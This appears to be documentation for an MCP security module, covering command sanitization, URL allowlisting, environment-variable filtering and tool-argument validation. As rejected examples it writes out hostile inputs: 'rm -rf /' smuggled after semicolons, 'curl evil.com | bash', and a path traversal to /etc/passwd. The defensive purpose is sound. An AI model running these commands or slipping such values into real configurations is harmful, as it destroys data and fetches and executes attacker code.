# MCP Security Documentation

## Overview

The MCP security module provides comprehensive security validation and sanitization for all interactions with MCP servers. It implements a defense-in-depth approach with multiple layers of validation to prevent command injection, unauthorized network access, and data exfiltration.

## Security Principles

### Threat Model

The security module addresses the following threats:

1. **Command Injection**: Malicious commands executed through stdio transport
2. **Network Attacks**: Unauthorized network access through HTTP transport
3. **Data Exfiltration**: Sensitive information leaked through environment variables
4. **Resource Abuse**: Excessive resource consumption through tool arguments
5. **Privilege Escalation**: Unauthorized access to system resources

### Security Levels

Three configurable security levels provide different trade-offs between security and functionality:

- **Strict**: Maximum security with minimal allowed operations
- **Moderate**: Balanced security suitable for most use cases
- **Permissive**: Relaxed security for trusted environments

## Command Sanitization

### prepare_command()

**What it does**: This is the main function that checks if a command is safe to run. It takes a command string (like "python -m server") and makes sure it doesn't contain dangerous characters that could be used to hack your system.

**Why you need it**: When MCP servers run commands on your computer, malicious servers could try to run harmful commands like deleting files. This function prevents that.

**Parameters**:

- `command` (required): The command string you want to run (e.g., "python -m my_server")
- `max_length`: Maximum allowed length (default: 1000 characters)
- `security_level`: How strict to be - "strict", "moderate", or "permissive" (default: "strict")
- `allowed_executables`: Optional list of programs you specifically allow

**Returns**: A list of command parts that are safe to use

**Note**: Executables are compared case-insensitively after stripping common Windows extensions (.exe, .bat, .cmd, .ps1).

```python
from massgen.mcp_tools.security import prepare_command

# ✅ Safe command preparation
safe_command = prepare_command(
    command="python -m my_mcp_server --port 8000",
    security_level="moderate"
)
print(f"Sanitized command: {safe_command}")
# Output: ['python', '-m', 'my_mcp_server', '--port', '8000']

# ❌ Dangerous command (will raise ValueError)
try:
    dangerous_command = prepare_command(
        command="python; rm -rf /",  # Contains shell metacharacters
        security_level="strict"
    )
except ValueError as e:
    print(f"Security violation: {e}")
    # Output: "MCP command cannot contain shell metacharacters: ;"

# ✅ Using custom allowed executables
custom_command = prepare_command(
    command="my-custom-tool --safe-mode",
    security_level="strict",
    allowed_executables={"my-custom-tool", "python"}
)
```

### \_normalize_security_level()

**What it does**: Internal helper function that ensures security levels are valid. If you pass an invalid level, it defaults to "strict" for safety.

**Why it exists**: Prevents typos in security level names from accidentally making your system less secure.

```python
# This is used internally, but here's how it works:
level = _normalize_security_level("moderate")  # Returns "moderate"
level = _normalize_security_level("typo")      # Returns "strict" (safe default)
```

### Security Level Behaviors

#### Strict Mode

```python
# Strict mode - only allows alphanumeric characters and safe symbols
config = {
    "type": "stdio",
    "command": "python3",  # Must be in PATH or absolute path
    "args": ["-m", "server"],  # No shell metacharacters allowed
    "security": {"level": "strict"}
}

# Blocked in strict mode:
# - Shell metacharacters: ; | & $ ` ( ) < >
# - Relative paths with ../
# - Commands not in PATH
```

#### Moderate Mode

```python
# Moderate mode - allows common development patterns
config = {
    "type": "stdio",
    "command": "/usr/local/bin/node",  # Absolute paths allowed
    "args": ["server.js", "--config=./config.json"],  # Relative paths OK
    "security": {"level": "moderate"}
}

# Additional allowances in moderate mode:
# - Absolute paths to executables
# - Relative paths without ../
# - Common CLI argument patterns
```

#### Permissive Mode

```python
# Permissive mode - minimal restrictions for trusted environments
config = {
    "type": "stdio",
    "command": "bash",
    "args": ["-c", "cd /app && python server.py"],  # Shell commands allowed
    "security": {"level": "permissive"}
}

# Permissive mode still blocks:
# - Known dangerous patterns
# - Obvious injection attempts
# - Null bytes and control characters
```

## URL Validation

### validate_url()

**What it does**: Checks if a web URL is safe to connect to. It looks at the web address and makes sure it's not trying to connect to dangerous places on your network or the internet.

**Why you need it**: MCP servers that use HTTP connections could try to access internal systems on your network or connect to malicious websites. This function blocks those attempts.

**Parameters**:

- `url` (required): The web address to check (e.g., "https://api.example.com/mcp")
- `resolve_dns`: Whether to look up the actual IP address (default: False)
- `allow_private_ips`: Whether to allow connections to private network addresses (default: False)
- `allow_localhost`: Whether to allow connections to your own computer (default: False)
- `allowed_hostnames`: List of exact hostnames you trust (optional, no wildcards or patterns)

**Returns**: True if the URL is safe, raises ValueError if dangerous

```python
from massgen.mcp_tools.security import validate_url

# ✅ Safe URL validation
try:
    is_safe = validate_url(
        "https://api.example.com/mcp",
        resolve_dns=True,
        allowed_hostnames={"api.example.com", "trusted-service.com"}
    )
    print(f"URL is safe: {is_safe}")
except ValueError as e:
    print(f"URL validation failed: {e}")

# ❌ Examples of blocked URLs and why:
blocked_examples = {
    "http://localhost:22/mcp": "SSH port - could be used to hack",
    "https://192.168.1.1/mcp": "Private IP - could access internal systems",
    "ftp://example.com/file": "Non-HTTP protocol - only HTTP/HTTPS allowed",
    "https://malicious.com/mcp": "Not in allowlist - unknown website"
}

for url, reason in blocked_examples.items():
    try:
        validate_url(url)
    except ValueError as e:
        print(f"❌ {url} - {reason}")
        print(f"   Error: {e}")

# ✅ Advanced usage with DNS resolution
try:
    validate_url(
        "https://api.trusted-service.com/mcp",
        resolve_dns=True,  # Actually look up the IP address
        allow_private_ips=False,  # Block private network access
        allowed_hostnames={"api.trusted-service.com"}
    )
    print("✅ URL passed all security checks")
except ValueError as e:
    print(f"❌ Security check failed: {e}")
```

### Network Security Controls

#### DNS Resolution and IP Filtering

```python
# The validator performs DNS resolution and blocks:
# - Private IP ranges (RFC 1918)
# - Loopback addresses (except explicitly allowed)
# - Multicast and broadcast addresses
# - Reserved IP ranges

config = {
    "type": "streamable-http",
    "url": "https://api.example.com/mcp",
    "security": {
        "level": "strict",
        "allow_private_ips": False,
        "allow_localhost": False,
        "allowed_hostnames": ["api.example.com"]
    }
}
```

#### Hostname Allowlists

**Note**: Only exact hostname matches are supported. Wildcards, regex patterns, and subdomain matching are not supported.

```python
# Restrict connections to specific hosts
config = {
    "type": "streamable-http",
    "url": "https://mcp.trusted-service.com/api",
    "security": {
        "level": "moderate",
        "allowed_hostnames": [
            "mcp.trusted-service.com",
            "api.trusted-service.com"
        ]
    }
}
```

```yaml
# YAML configuration example
security:
  allowed_hostnames:
    - "mcp.trusted-service.com"
    - "api.trusted-service.com"
```

## Environment Variable Validation

### validate_environment_variables()

**What it does**: Environment variables are like settings that programs can read (like API keys, passwords, file paths). This function filters out dangerous or sensitive variables before they're passed to MCP servers.

**Why you need it**: MCP servers shouldn't have access to your passwords, API keys, or other sensitive information stored in environment variables. This function removes or filters them.

**Parameters**:

- `env` (required): Dictionary of environment variables to check
- `level`: Security level - "strict", "moderate", or "permissive" (default: "strict")
- `mode`: How to filter - "allowlist" (only allow specific ones) or "denylist" (block specific ones)
- `allowed_vars`: List of variables to allow (when using allowlist mode)
- `denied_vars`: List of variables to block (when using denylist mode)
- `max_key_length`: Maximum length for variable names (default: 100)
- `max_value_length`: Maximum length for variable values (default: 1000)

**Returns**: Dictionary of safe environment variables

```python
from massgen.mcp_tools.security import validate_environment_variables

# ✅ Allowlist mode - only let through safe variables
safe_env = validate_environment_variables(
    env={"API_KEY": "secret123", "DEBUG": "true", "PATH": "/usr/bin", "LOG_LEVEL": "INFO"},
    mode="allowlist",
    allowed_vars={"DEBUG", "LOG_LEVEL", "CONFIG_PATH"}  # Only these are allowed
)
print(f"Safe environment: {safe_env}")
# Output: {"DEBUG": "true", "LOG_LEVEL": "INFO"}
# Note: API_KEY and PATH were filtered out for security

# ✅ Denylist mode - block dangerous variables
filtered_env = validate_environment_variables(
    env={"API_KEY": "secret", "DEBUG": "true", "USER": "admin", "PASSWORD": "123"},
    mode="denylist",
    denied_vars={"API_KEY", "PASSWORD", "SECRET"}  # Block these dangerous ones
)
print(f"Filtered environment: {filtered_env}")
# Output: {"DEBUG": "true", "USER": "admin"}
# Note: API_KEY and PASSWORD were removed

# ✅ Strict mode automatically blocks common sensitive patterns
strict_env = validate_environment_variables(
    env={"GITHUB_TOKEN": "secret", "DEBUG": "true", "AWS_SECRET": "key"},
    level="strict",  # Automatically blocks *_TOKEN, *_SECRET, etc.
    mode="denylist"
)
print(f"Strict filtering: {strict_env}")
# Output: {"DEBUG": "true"}
# Note: GITHUB_TOKEN and AWS_SECRET automatically blocked

# ❌ Examples that will raise errors
try:
    # Variable name too long
    validate_environment_variables(
        env={"A" * 200: "value"},  # Name is 200 characters
        max_key_length=100
    )
except ValueError as e:
    print(f"❌ Variable name too long: {e}")

try:
    # Dangerous pattern in value
    validate_environment_variables(
        env={"SAFE_VAR": "value; rm -rf /"},  # Contains dangerous shell command
        mode="allowlist",
        allowed_vars={"SAFE_VAR"}
    )
except ValueError as e:
    print(f"❌ Dangerous pattern detected: {e}")
```

### Sensitive Data Patterns

The validator automatically detects and filters common sensitive patterns:

```python
# Automatically blocked patterns:
sensitive_patterns = [
    "*PASSWORD*",
    "*SECRET*",
    "*TOKEN*",
    "*KEY*",
    "AWS_*",
    "GITHUB_*",
    "*_CREDENTIAL*"
]

# Safe environment configuration
config = {
    "type": "stdio",
    "command": "python",
    "args": ["-m", "server"],
    "security": {
        "env": {
            "mode": "allowlist",
            "allowed_vars": [
                "LOG_LEVEL",
                "CONFIG_PATH",
                "PYTHONPATH",
                "HOME"
            ]
        }
    }
}
```

## Server Configuration Validation

### validate_server_security()

**What it does**: This is the main function that checks if your entire MCP server configuration is secure. It validates everything - the server name, commands, URLs, environment variables, and all security settings.

**Why you need it**: Before connecting to any MCP server, you want to make sure the configuration won't expose your system to security risks. This function catches dangerous configurations before they can cause problems.

**Parameters**:

- `config` (required): Dictionary containing all the server configuration settings

**Returns**: A validated and sanitized configuration dictionary

**What it checks**:

- Server names are safe (no special characters)
- Commands don't contain injection attacks
- URLs point to safe locations
- Environment variables don't leak secrets
- All settings are within safe limits

```python
from massgen.mcp_tools.security import validate_server_security

# ✅ Complete server validation example
server_config = {
    "name": "my_file_server",
    "type": "stdio",  # or "streamable-http"
    "command": "python",
    "args": ["-m", "mcp_server", "--safe-mode"],
    "env": {"LOG_LEVEL": "INFO", "CONFIG_PATH": "/safe/path"},
    "security": {
        "level": "moderate",
        "allowed_executables": ["python", "python3"],
        "env": {
            "mode": "allowlist",
            "allowed_vars": ["LOG_LEVEL", "CONFIG_PATH"]
        }
    }
}

try:
    # This validates EVERYTHING in your config
    secure_config = validate_server_security(server_config)
    print("✅ Configuration is secure!")
    print(f"Validated config: {secure_config}")

except ValueError as e:
    print(f"❌ Security validation failed: {e}")

# ✅ HTTP server validation
http_config = {
    "name": "web_api_server",
    "type": "streamable-http",
    "url": "https://api.trusted-service.com/mcp",
    "headers": {"Authorization": "Bearer safe-token"},
    "timeout": 30,
    "security": {
        "level": "strict",
        "allowed_hostnames": ["api.trusted-service.com"],
        "allow_private_ips": False
    }
}

try:
    secure_http_config = validate_server_security(http_config)
    print("✅ HTTP configuration is secure!")
except ValueError as e:
    print(f"❌ HTTP validation failed: {e}")

# ❌ Examples of configurations that will be rejected:

# Bad server name
bad_name_config = {
    "name": "server; rm -rf /",  # Contains dangerous characters
    "type": "stdio",
    "command": "python"
}

# Dangerous command
bad_command_config = {
    "name": "safe_server",
    "type": "stdio",
    "command": "python; curl evil.com | bash"  # Command injection attempt
}

# Unsafe URL
bad_url_config = {
    "name": "web_server",
    "type": "streamable-http",
    "url": "http://192.168.1.1:22/mcp"  # Private IP + SSH port
}

# Test each bad config
for bad_config in [bad_name_config, bad_command_config, bad_url_config]:
    try:
        validate_server_security(bad_config)
    except ValueError as e:
        print(f"❌ Correctly rejected unsafe config: {e}")
```

## Tool Security

### sanitize_tool_name()

**What it does**: Creates safe, standardized names for MCP tools. It takes a tool name and server name, then creates a unique, secure identifier that prevents naming conflicts and injection attacks.

**Why you need it**: Tool names could contain dangerous characters or conflict with system functions. This function ensures all tool names are safe and unique across different servers.

**Parameters**:

- `tool_name` (required): The original name of the tool (e.g., "file_reader")
- `server_name` (required): The name of the server providing the tool (e.g., "file_server")

**Returns**: A sanitized tool name with server prefix (e.g., "mcp**file_server**file_reader")

```python
from massgen.mcp_tools.security import sanitize_tool_name

# ✅ Safe tool name creation
safe_names = [
    sanitize_tool_name("file_reader", "file_server"),
    # → "mcp__file_server__file_reader"

    sanitize_tool_name("web-scraper", "web_tools"),
    # → "mcp__web_tools__web_scraper"

    sanitize_tool_name("data.processor", "analytics"),
    # → "mcp__analytics__data_processor"
]

print("Safe tool names:")
for name in safe_names:
    print(f"  {name}")

# ❌ Examples that will be rejected or sanitized:
dangerous_examples = [
    ("tool; rm -rf /", "server"),     # Shell injection attempt
    ("../../../etc/passwd", "server"), # Path traversal
    ("tool\x00hidden", "server"),     # Null byte injection
    ("", "server"),                   # Empty name
    ("connect", "server"),            # Reserved name
]

for tool_name, server_name in dangerous_examples:
    try:
        result = sanitize_tool_name(tool_name, server_name)
        print(f"✅ Sanitized '{tool_name}' → '{result}'")
    except ValueError as e:
        print(f"❌ Rejected '{tool_name}': {e}")

# ✅ Understanding the naming convention
# Format: mcp__<server_name>__<tool_name>
# This prevents conflicts between servers and makes tools easily identifiable
example_tool = sanitize_tool_name("analyze_code", "github_tools")
print(f"Tool format: {example_tool}")
# Shows: mcp__github_tools__analyze_code
```

### validate_tool_arguments()

**What it does**: Checks that the arguments you're sending to an MCP tool are safe and not too large. It prevents injection attacks through tool parameters and ensures data doesn't exceed memory limits.

**Why you need it**: Malicious or buggy code could send huge amounts of data or dangerous content through tool arguments. This function blocks those attempts.

**Parameters**:

- `arguments` (required): Dictionary of arguments to validate
- `max_depth`: How deeply nested the data can be (default: 5 levels)
- `max_size`: Rough maximum size in bytes (default: 10,000)

**Returns**: Validated arguments dictionary (cleaned and safe)

```python
from massgen.mcp_tools.security import validate_tool_arguments

# ✅ Safe argument validation
safe_args = {
    "file_path": "documents/report.txt",
    "max_lines": 100,
    "options": ["verbose", "format-json"],
    "metadata": {
        "author": "user",
        "created": "2024-01-01"
    }
}

try:
    validated = validate_tool_arguments(safe_args)
    print("✅ Arguments are safe:")
    print(f"  {validated}")
except ValueError as e:
    print(f"❌ Validation failed: {e}")

# ✅ Understanding size limits
# The function estimates JSON size to prevent memory attacks
large_but_safe = {
    "data": ["item"] * 100,  # 100 items - usually OK
    "description": "A" * 1000  # 1000 characters - usually OK
}

try:
    validate_tool_arguments(large_but_safe)
    print("✅ Large data passed validation")
except ValueError as e:
    print(f"❌ Too large: {e}")

# ❌ Examples that will be rejected:

# Too deeply nested
too_deep = {"a": {"b": {"c": {"d": {"e": {"f": "too deep"}}}}}}

# Too many items in a list
too_many_items = {"items": list(range(2000))}  # 2000 items

# Individual string too long
too_long_string = {"text": "A" * 20000}  # 20,000 characters

# Test each problematic case
test_cases = [
    ("deeply nested", too_deep),
    ("too many items", too_many_items),
    ("string too long", too_long_string)
]

for description, args in test_cases:
    try:
        validate_tool_arguments(args)
        print(f"✅ {description} - unexpectedly passed")
    except ValueError as e:
        print(f"❌ {description} - correctly rejected: {e}")

# ✅ Best practices for tool arguments
best_practice_args = {
    # Keep strings reasonable length
    "message": "Hello world",

    # Limit list sizes
    "files": ["file1.txt", "file2.txt", "file3.txt"],

    # Avoid deep nesting
    "config": {
        "mode": "safe",
        "timeout": 30
    },

    # Use simple data types when possible
    "count": 42,
    "enabled": True
}

validated_best = validate_tool_arguments(best_practice_args)
print("✅ Best practice arguments validated successfully")
```

## Secure Configuration Patterns

### stdio Transport Security

```yaml
# Based on massgen/configs/claude_code_discord_mcp_example.yaml
# Note: Only security.level and security.env are validated by validate_server_security()
mcp_servers:
  secure_file_server:
    type: "stdio"
    command: "python3"
    args: ["-m", "file_server", "--safe-mode"]
    timeout: 30
    security:
      level: "strict"  # Validated: strict/moderate/permissive
      env:             # Validated: environment filtering policies
        mode: "allowlist"
        allowed_vars: ["LOG_LEVEL", "CONFIG_PATH"]
    # Note: resource_limits not currently validated by the library; illustrative only
    resource_limits:
      max_memory: "256MB"
      max_cpu: "50%"
      max_files: 100
```

### HTTP Transport Security

```yaml
# Secure HTTP configuration
# Note: Only security fields listed below are validated by validate_server_security()
mcp_servers:
  secure_api_server:
    type: "streamable-http"
    url: "https://api.trusted-service.com/mcp"
    security:
      level: "moderate"                              # Validated
      allowed_hostnames: ["api.trusted-service.com"]  # Validated
      allow_private_ips: false                        # Validated
      resolve_dns: false                              # Validated
      allow_localhost: false                          # Validated
    headers:
      Authorization: "Bearer ${MCP_API_TOKEN}"
      User-Agent: "MassGen-MCP/1.0"
    # Note: Fields below not currently validated by the library; illustrative only
    # dns_timeout: 5
    # connection_timeout: 10
    # tls_security:
    #   verify_ssl: true
    #   min_tls_version: "1.2"
    #   allowed_ciphers: ["ECDHE-RSA-AES256-GCM-SHA384"]
```

## Security Checklist

### Pre-Deployment Security Review

- [ ] **Command Validation**: All stdio commands use absolute paths or PATH lookup
- [ ] **Argument Sanitization**: No shell metacharacters in command arguments
- [ ] **URL Validation**: HTTP URLs are allowlisted and use HTTPS
- [ ] **Environment Security**: Sensitive variables are filtered or allowlisted
- [ ] **Network Controls**: Private IPs and dangerous ports are blocked
- [ ] **TLS Configuration**: Strong TLS settings for HTTP transport
- [ ] **Resource Limits**: Memory, CPU, and file limits are configured
- [ ] **Logging**: Security events are logged for monitoring

### Runtime Security Monitoring

```python
import logging

# Configure security logging
security_logger = logging.getLogger('massgen.mcp_tools.security')
security_logger.setLevel(logging.WARNING)

# Monitor security events
handler = logging.StreamHandler()
handler.setFormatter(logging.Formatter(
    '%(asctime)s - SECURITY - %(levelname)s - %(message)s'
))
security_logger.addHandler(handler)
```

### Token and Credential Management

```python
# Secure credential handling
import os
from pathlib import Path

def load_secure_config():
    """Load configuration with secure credential handling."""
    config = {
        "type": "streamable-http",
        "url": "https://api.example.com/mcp",
        "headers": {
            # Load from environment, not hardcoded
            "Authorization": f"Bearer {os.getenv('MCP_API_TOKEN')}",
        },
        "security": {
            "level": "strict"
        }
    }

    # Validate token is present
    if not os.getenv('MCP_API_TOKEN'):
        raise ValueError("MCP_API_TOKEN environment variable required")

    return config
```

## Troubleshooting Security Issues

### Common Security Validation Errors

#### Command Injection Prevention

```
ValueError: Command contains dangerous characters: ';'
```

**Solution**: Remove shell metacharacters from command and arguments

```python
# Wrong
command = "python; echo 'injected'"

# Correct
command = "python"
args = ["-c", "print('safe')"]
```

#### URL Validation Failures

```
ValueError: URL resolves to private IP address
```

**Solution**: Use public hostnames or configure private IP allowlist

```python
# Wrong
url = "http://192.168.1.100/mcp"

# Correct
url = "https://public-api.example.com/mcp"
# Or allow private IPs in config
config["network_security"]["allow_private_ips"] = True
```

#### Environment Variable Filtering

```
ValueError: Sensitive environment variable detected: API_SECRET
```

**Solution**: Use allowlist mode or remove sensitive variables

```python
# Configure environment filtering
config["security"] = {
    "env": {
        "mode": "allowlist",
        "allowed_vars": ["LOG_LEVEL", "CONFIG_PATH"]
    }
}
```

#### Tool Argument Validation

```
ValueError: Tool argument contains invalid characters
```

**Solution**: Sanitize arguments or adjust validation schema

```python
# Sanitize file paths
safe_path = re.sub(r'[^a-zA-Z0-9._/-]', '', user_input)

# Or use stricter schema
schema = {
    "properties": {
        "path": {"pattern": "^[a-zA-Z0-9._/-]+$"}
    }
}
```

### Debug Security Validation

Enable detailed security logging for troubleshooting:

```python
import logging

# Enable debug logging for security module
logging.getLogger('massgen.mcp_tools.security').setLevel(logging.DEBUG)

# This will show detailed validation steps
async with MCPClient(config) as client:
    await client.connect()  # Security validation details logged
```

### Security Testing

Test security configurations with known bad inputs:

```python
async def test_security_validation():
    """Test security validation with malicious inputs."""

    # Test command injection
    try:
        bad_config = {
            "command": "python; rm -rf /",
            "args": [],
            "security": {
            "level": "strict"
        }
        }
        client = MCPClient(bad_config)
        assert False, "Should have raised ValueError"
    except ValueError:
        print("✓ Command injection blocked")

    # Test URL validation
    try:
        bad_url_config = {
            "type": "streamable-http",
            "url": "http://localhost:22/mcp",
            "security": {
            "level": "strict"
        }
        }
        validate_url(bad_url_config["url"])  # uses defaults
        assert False, "Should have blocked dangerous port"
    except ValueError:
        print("✓ Dangerous URL blocked")
```

This comprehensive security framework ensures that MCP integrations maintain strong security posture while providing the flexibility needed for legitimate use cases.
